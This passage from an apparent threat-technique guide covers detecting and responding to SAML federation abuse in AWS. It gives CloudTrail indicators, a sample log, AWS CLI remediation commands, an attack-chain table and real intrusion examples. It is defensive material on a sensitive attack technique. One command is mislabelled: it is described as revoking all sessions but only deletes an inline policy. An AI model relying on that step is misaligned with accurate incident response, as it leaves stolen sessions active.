**What to Look For:**
- Only 1-2 SAML providers registered (not dozens)
- Certificate expiration dates are recent (within 1 year)
- Role trust policies list only known/authorized IdPs
- No self-signed or attacker-controlled certificates

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **CloudTrail Events:** Look for:
    - `CreateSAMLProvider` or `UpdateSAMLProvider` by non-admin accounts
    - `UpdateAssumeRolePolicy` adding SAML principals
    - `AssumeRoleWithSAML` from unexpected source IPs
    - Multiple `AssumeRoleWithSAML` events for high-privilege roles in short time

*   **Network IOCs:**
    - Outbound HTTPS to non-standard SAML endpoints
    - Unusual certificate exchanges with IdP endpoints
    - Traffic to attacker-controlled domains from federated users' machines

*   **Cloud IOCs:**
    - New SAML providers registered (check AWS IAM console regularly)
    - Role trust policies modified to add external SAML principals
    - Session tokens issued to unexpected source IPs

### Forensic Artifacts

*   **CloudTrail Log:**
    ```json
    {
      "eventName": "AssumeRoleWithSAML",
      "eventSource": "sts.amazonaws.com",
      "userIdentity": {
        "type": "SAMLUser",
        "principalId": "admin@company.com",
        "arn": "arn:aws:iam::123456789012:role/AdminRole"
      },
      "sourceIPAddress": "192.0.2.1",  // Attacker IP
      "userAgent": "aws-cli/2.0.0",
      "requestParameters": {
        "roleArn": "arn:aws:iam::123456789012:role/AdminRole",
        "principalArn": "arn:aws:iam::123456789012:saml-provider/OktaProvider",
        "durationSeconds": 3600
      }
    }
    ```

*   **IdP Audit Logs:**
    - SAML assertion generation events
    - Certificate export or rotation events
    - Federation rule changes

*   **Network Logs (VPC Flow Logs):**
    - Unexpected outbound traffic to SAML endpoints
    - TLS handshakes with unusual certificate subjects

### Response Procedures

1.  **Isolate:**
    **Command (AWS CLI):**
    ```bash
    # Revoke all active sessions for the compromised role
    aws iam delete-role-policy --role-name AdminRole --policy-name "inline-policy"
    
    # Disable the SAML provider
    aws iam delete-saml-provider --saml-provider-arn arn:aws:iam::123456789012:saml-provider/OktaProvider
    
    # Alternatively, update assume role policy to deny all SAML
    aws iam update-assume-role-policy --role-name AdminRole --policy-document file://deny_all.json
    ```

    **Manual (AWS Console):**
    - Go to **IAM** → **Roles** → **AdminRole**
    - Click **Delete role**
    - Recreate with updated trust policy after investigation

2.  **Collect Evidence:**
    **Command (Export CloudTrail Logs):**
    ```bash
    # Export all SAML-related CloudTrail events for the past 90 days
    aws cloudtrail lookup-events \
      --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRoleWithSAML \
      --start-time 2025-10-10T00:00:00Z \
      --max-results 50 \
      --output json > saml_events.json
    
    # Parse and analyze
    jq '.Events[] | {eventTime, sourceIPAddress, requestParameters}' saml_events.json
    ```

    **Manual (AWS Console):**
    - Go to **CloudTrail** → **Event History**
    - Filter by **Event name: AssumeRoleWithSAML**
    - Select events, click **Export results**

3.  **Remediate:**
    **Command (Re-secure Federation):**
    ```bash
    # Delete the compromised SAML provider
    aws iam delete-saml-provider --saml-provider-arn arn:aws:iam::123456789012:saml-provider/AttackerProvider
    
    # Rotate the legitimate IdP signing certificate (Okta example via API)
    curl -X POST https://yourorg.okta.com/api/v1/certs -H "Authorization: Bearer $OKTA_TOKEN" \
      -H "Content-Type: application/json" \
      -d '{"name":"new-signing-cert","type":"RSA"}'
    
    # Update AWS SAML provider with new certificate
    aws iam update-saml-provider \
      --saml-metadata-document file://new_metadata.xml \
      --saml-provider-arn arn:aws:iam::123456789012:saml-provider/OktaProvider
    ```

    **Manual:**
    - Contact IdP vendor to rotate certificates
    - Update AWS SAML provider metadata in IAM console
    - Verify all federated users can still log in
    - Change passwords for all administrators

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [CROSS-CLOUD-002] Google Cloud Identity Sync Compromise | Compromise cloud identity infrastructure |
| **2** | **Privilege Escalation** | **[CROSS-CLOUD-001]** | **Abuse AWS federation to impersonate high-privilege users** |
| **3** | **Persistence** | [IA-EXPLOIT-001] Azure Application Proxy Exploitation | Maintain access via cloud proxy |
| **4** | **Lateral Movement** | [CROSS-CLOUD-003] Multi-Cloud Service Account Abuse | Move to other clouds using stolen credentials |
| **5** | **Impact** | [Impact Techniques] Data exfiltration, ransomware deployment | Achieve business objectives |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: APT29 (Cozy Bear) - SolarWinds Compromise (C0024)

- **Target:** U.S. Government agencies, Fortune 500 companies
- **Timeline:** December 2020 - January 2021 (public disclosure)
- **Technique Status:** ACTIVE - APT29 added a federated identity provider to Azure AD and configured the domain to accept authorization tokens signed by their own SAML signing certificate
- **Impact:** Compromise of multiple critical U.S. government networks (Treasury, DHS, CISA); access to sensitive intelligence
- **Reference:** [CISA Alert AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/13/alert-aa20-352a-advanced-persistent-threat-compromise-us-government-agencies)

### Example 2: Scattered Spider (UNC3944) - Identity Provider Abuse (G1015)

- **Target:** Financial institutions, healthcare, entertainment
- **Timeline:** 2021-2023 (ongoing)
- **Technique Status:** ACTIVE - Scattered Spider added a federated identity provider to the victim's SSO tenant and activated automatic account linking
- **Impact:** Lateral movement across victim organizations; persistent access to M365 and connected SaaS applications
- **Reference:** [Mandiant Report on Scattered Spider](https://www.mandiant.com/resources/blog/apt-unc3944-scattered-spider-is-a-threat-to-smbs-and-enterprises)

---

## 10. ADDITIONAL RESOURCES

- [OWASP SAML Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
- [AWS IAM SAML Authentication](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_saml.html)
- [SpecterOps Golden SAML Attack](https://posts.specterops.io/golden-saml-3abb77f58dd3)
- [MITRE ATT&CK T1484.002](https://attack.mitre.org/techniques/T1484/002/)

---